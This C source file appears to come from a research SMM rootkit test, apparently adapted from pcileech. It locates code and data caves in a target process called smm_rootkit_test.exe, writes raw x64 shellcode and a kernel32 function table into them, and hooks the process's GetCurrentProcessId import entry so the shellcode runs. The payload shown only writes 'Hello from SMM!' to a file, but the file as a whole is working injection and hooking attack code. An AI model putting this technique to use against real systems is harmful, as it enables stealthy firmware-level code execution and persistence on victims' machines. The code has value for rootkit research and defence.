#include "CheatSmmRootkitTest.h"
#include "vmm.h"

// For the tester program
static WinProc   rootkit_test;
static WinModule rootkit_test_module;

// From NtKernelTools.c
extern WinCtx *winGlobal;


// struct shared with wx64_umd_exec_c.c
typedef struct tdUMD_EXEC_CONTEXT_LIMITED {
    INT64 fCMPXCHG;
    CHAR8 fStatus;
    VOID* hProcessHandle;
    struct {
        UINT64 CloseHandle;
        UINT64 CreateFileA;
        UINT64 CreateProcessA;
        UINT64 CreateThread;
        UINT64 GetExitCodeProcess;
        UINT64 ReadFile;
        UINT64 WriteFile;
        UINT64 LocalAlloc;
    } fn;
    CHAR8 szString1[100];
    CHAR8 szString2[100];
} UMD_EXEC_CONTEXT_LIMITED, *PUMD_EXEC_CONTEXT_LIMITED;

// shellcode to inject into the UMD
const UINT8 WINX64_UMD_EXEC[] = {
	0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0xEB, 0x10, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 
	0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x50, 0x48, 0x8B, 0x0D, 0xE8, 0xFF, 0xFF, 0xFF, 
	0x48, 0x83, 0xEC, 0x30, 0xE8, 0x13, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x30, 0x58, 0x41, 0x59, 
	0x41, 0x58, 0x5A, 0x59, 0xFF, 0x25, 0xD6, 0xFF, 0xFF, 0xFF, 0xCC, 0xCC, 0x48, 0x8B, 0xC4, 0x48, 
	0x89, 0x58, 0x08, 0x57, 0x48, 0x83, 0xEC, 0x40, 0x48, 0x83, 0x79, 0x18, 0x00, 0x48, 0x8B, 0xD9, 
	0x74, 0x52, 0x48, 0x83, 0x60, 0xE8, 0x00, 0x48, 0x83, 0xC1, 0x58, 0xC7, 0x40, 0xE0, 0x80, 0x00, 
	0x00, 0x00, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0xC7, 0x40, 0xD8, 0x02, 0x00, 0x00, 0x00, 0xBA, 
	0x00, 0x00, 0x00, 0xC0, 0xFF, 0x53, 0x20, 0x48, 0x8B, 0xF8, 0x48, 0x83, 0xF8, 0xFF, 0x74, 0x24, 
	0x48, 0x83, 0x64, 0x24, 0x20, 0x00, 0x48, 0x8D, 0x93, 0xBC, 0x00, 0x00, 0x00, 0x45, 0x33, 0xC9, 
	0x48, 0x8B, 0xC8, 0x45, 0x8D, 0x41, 0x10, 0xFF, 0x53, 0x48, 0x48, 0x8B, 0xCF, 0xFF, 0x53, 0x18, 
	0xC6, 0x43, 0x08, 0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x40, 0x5F, 0xC3
};


// these vars are needed between different stages, therefore 
// they are defined global
static VMMDLL_WIN_THUNKINFO_IAT oThunkInfoIAT;
static UINT64 vaCodeCave;
static UINT64 vaWriteCave;
static UINT64 currStage;

// From pcileech, for injecting UM shellcode into the target
static VOID UmdExec()
{
	if(currStage != 0)
	{
		return;
	}
	UMD_EXEC_CONTEXT_LIMITED ctx;
  CHAR8* szHookModule = "kernel32.dll";
	CHAR8* szHookFunction = "GetCurrentProcessId";

	//--------------------------------------------------------------------------
	// 1: Verify process and locate 'IAT inject', r-x 'code cave' and rw- 'config cave'.
	//--------------------------------------------------------------------------

	SerialPrintStringDebug("  Getting process IAT Thunk ...\r\n");
	if(!ProcessGetThunkInfoIAT(&rootkit_test, &rootkit_test_module, szHookModule, szHookFunction, &oThunkInfoIAT))
	{
		SerialPrintString("ERROR: UMD EXEC: Could not get IAT Info!\r\n");
		return;
	}
	if(!oThunkInfoIAT.fValid || oThunkInfoIAT.f32)
	{
		SerialPrintString("ERROR: UMD: EXEC: Could not retrieve valid hook in 64-bit process.\r\n");
		return;
	}

	SerialPrintStringDebug("  Finding process sections for code & write caves ...\r\n");
	UINT32 cSections;
	PIMAGE_SECTION_HEADER pSections;
	if(!ProcessGetSections(&rootkit_test, &rootkit_test_module, NULL, 0, &cSections) || !cSections)
	{
		SerialPrintString("ERROR: UMD: EXEC: Could not retrieve sections #1\r\n");
		return;
  }

	pSections = (PIMAGE_SECTION_HEADER)malloc(cSections * sizeof(IMAGE_SECTION_HEADER));
	if(!pSections || !ProcessGetSections(&rootkit_test, &rootkit_test_module, pSections, cSections, &cSections) || !cSections)
	{
		SerialPrintString("ERROR: UMD: EXEC: Could not retrieve sections #2\r\n");
		return;
	}

	for(UINT32 i = 0; i < cSections; i++)
	{
		// 0x500 magic number for pbExec to fit in
		if(!vaCodeCave && (pSections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && ((pSections[i].Misc.VirtualSize & 0xfff) < (0x1000 - 0x500)))
		{
			vaCodeCave = rootkit_test_module.baseAddress + ((pSections[i].VirtualAddress + pSections[i].Misc.VirtualSize + 0xfff) & ~0xfff) - 0x500;
			// TODO; here we should check if the address is valid or not...?
			if(!VTOP(vaCodeCave & ~0xfff, rootkit_test.dirBase, FALSE))
			{
					vaCodeCave = 0;     // read test failed!
			}
		}
		if(!vaWriteCave && (pSections[i].Characteristics & IMAGE_SCN_MEM_WRITE) && ((pSections[i].Misc.VirtualSize & 0xfff) < (0x1000 - sizeof(ctx))))
		{
			vaWriteCave += rootkit_test_module.baseAddress + ((pSections[i].VirtualAddress + pSections[i].Misc.VirtualSize + 0xfff) & ~0xfff) - sizeof(ctx);
			// TODO; here we should check if the address is valid or not...?
			if(!VTOP(vaWriteCave & ~0xfff, rootkit_test.dirBase, FALSE))
			{
					vaWriteCave = 0;     // read test failed!
			}
		}
  }
	if(!vaCodeCave || !vaWriteCave)
	{
		if(!vaCodeCave)
		{
			SerialPrintString("ERROR: UMD: EXEC: Could not find a code cave!\r\n");
		}
		if(!vaWriteCave)
		{
			SerialPrintString("ERROR: UMD: EXEC: Could not find a write cave!\r\n");
		}
		return;
	}


	//------------------------------------------------
	// 2: Prepare injection and patch shellcode
	//------------------------------------------------

	SerialPrintStringDebug("  Suitable caves found! Dumping kernel32.dll exports ...\r\n");
	// prepare shellcode (goes into r-x section)
	UINT8* pbExec = (UINT8*)malloc(sizeof(WINX64_UMD_EXEC));
	p_memCpy((UINT64)pbExec, (UINT64)WINX64_UMD_EXEC, sizeof(WINX64_UMD_EXEC), FALSE);
	*(UINT64*)(pbExec + 0x08) = vaWriteCave;
	*(UINT64*)(pbExec + 0x10) = oThunkInfoIAT.vaFunction;

	// Dump the module kernel32.dll, we need it to map exports
	WinModule kernel32_dll;
	kernel32_dll.name = "kernel32.dll";
	if(!DumpSingleModule(winGlobal, &rootkit_test, &kernel32_dll, FALSE))
	{
		SerialPrintStringDebug("Could not dump kernel32.dll from the target process!\r\n");
		free(pbExec);
		return;
	}

	// set the xchg value to 0
	// TODO: atomicity / mutex !
	ctx.fCMPXCHG = 0;
	// prepare configuration data (goes into rw- section)
	ctx.fn.CloseHandle =  PE_GetProcAddress(&rootkit_test, &kernel32_dll, "CloseHandle");
	ctx.fn.CreateFileA = PE_GetProcAddress(&rootkit_test, &kernel32_dll, "CreateFileA");
	ctx.fn.CreateProcessA = PE_GetProcAddress(&rootkit_test, &kernel32_dll, "CreateProcessA");
	ctx.fn.CreateThread = PE_GetProcAddress(&rootkit_test, &kernel32_dll, "CreateThread");
	ctx.fn.GetExitCodeProcess = PE_GetProcAddress(&rootkit_test, &kernel32_dll, "GetExitCodeProcess");
	ctx.fn.ReadFile = PE_GetProcAddress(&rootkit_test, &kernel32_dll, "ReadFile");
	ctx.fn.WriteFile = PE_GetProcAddress(&rootkit_test, &kernel32_dll, "WriteFile");
	ctx.fn.LocalAlloc = PE_GetProcAddress(&rootkit_test, &kernel32_dll, "LocalAlloc");
	// hardcoded name to make it ez
	p_memCpy((UINT64)ctx.szString1, (UINT64)"c:\\smm.txt", strlen("c:\\smm.txt") + 1, FALSE);
	p_memCpy((UINT64)ctx.szString2, (UINT64)"Hello from SMM!", strlen("Hello from SMM!") + 1, FALSE);

	//------------------------------------------------
	// 4: TODO: Inject & hook IAT
	//------------------------------------------------

	v_memWrite(vaWriteCave, (UINT64)&ctx, sizeof(UMD_EXEC_CONTEXT_LIMITED), rootkit_test.dirBase, FALSE);
	v_memWrite(vaCodeCave, (UINT64)pbExec, sizeof(WINX64_UMD_EXEC), rootkit_test.dirBase, FALSE);
	v_memWrite(oThunkInfoIAT.vaThunk, (UINT64)&vaCodeCave, 8, rootkit_test.dirBase, FALSE);

	//------------------------------------------------
	// 5: Wait for execution
	//------------------------------------------------

	SerialPrintStringDebug("  Waiting for execution... \r\n");
	// wait this loop for 15sec, move it into its own "stage"
	/*
	while(TRUE)
	{
		if(1)  // if timeout
		{
			break;
		}
		if(!v_memCpy((UINT64)&ctx, vaWriteCave, sizeof(UMD_EXEC_CONTEXT_LIMITED), rootkit_test.dirBase, FALSE))
		{
			break;
		}
		if(ctx.fStatus)
		{
			break;
		}
		// Sleep(10);
	}

	if(!ctx.fStatus)
	{
		SerialPrintStringDebug("UMD: FAILED! Error or Timeout after 15s.\r\n");
	}
	else
	{
		SerialPrintStringDebug("UMD: Execution succeeded!\r\n");
	}
	*/

	//------------------------------------------------
	// 6: Restore
	//------------------------------------------------

	// SerialPrintStringDebug("UMD: Restoring...\r\n");
	//ZeroMemory(pbExec, sizeof(pbExec));
	//ZeroMemory(&ctx, sizeof(UMD_EXEC_CONTEXT_LIMITED));
	// v_memWrite(oThunkInfoIAT.vaThunk, (UINT64)&oThunkInfoIAT.vaFunction, 8, rootkit_test.dirBase, FALSE);

	//VmmPrx_MemWrite(dwPID, vaCodeCave, pbExec, sizeof(pbExec));
	//VmmPrx_MemWrite(dwPID, vaWriteCave, (UINT8*)&ctx, sizeof(UMD_EXEC_CONTEXT_LIMITED));

	currStage = 1;
}

BOOLEAN InitCheatTest()
{
  // Dump Process List and search for process
	BOOLEAN status = FALSE;
	BOOLEAN verbose = FALSE;

	WinProc process;

	SerialPrintStringDebug("\r\n== Starting IAT Hooking == \r\n");

	status = DumpSingleProcess(winGlobal, "smm_rootkit_te", &process, verbose);
	if (status == FALSE)
	{
    SerialPrintStringDebug("Failed finding process... \r\n");
		return FALSE;
	}
	else
	{
		rootkit_test.dirBase = process.dirBase;
		rootkit_test.physProcess = process.physProcess;
		rootkit_test.process = process.process;
	}

  // Prepare Module with the name
	rootkit_test_module.name = "smm_rootkit_test.exe";
	status = DumpSingleModule(winGlobal, &rootkit_test, &rootkit_test_module, verbose);

	if (status == FALSE)
	{
		SerialPrintStringDebug("Failed parsing the base exe module! \r\n");
		return FALSE;
	}

	vaCodeCave = 0;
	vaWriteCave = 0;
	currStage = 0;

	SerialPrintStringDebug("  Process context acquisition done! Executing IAT hook ... \r\n");

	UmdExec();

	SerialPrintStringDebug("== IAT Hooking done! Hope it works :-) == \r\n\r\n");

  return TRUE;
}

VOID CheatTestMain()
{
  // Sanity checking
	if (rootkit_test.dirBase == 0 || rootkit_test_module.baseAddress == 0)
	{
    SerialPrintStringDebug("The process dirbase or its module baseaddress was 0!\r\n");
		return;
	}

  //UINT64 pSrc = translate(rootkit_test_module.baseAddress + stringOffset, rootkit_test.dirBase, FALSE);
  //char* text = (char*)pSrc;

  //SerialPrintString("The string: ");
  //SerialPrintString(text);
  //SerialPrintString("\r\n");

  return;
}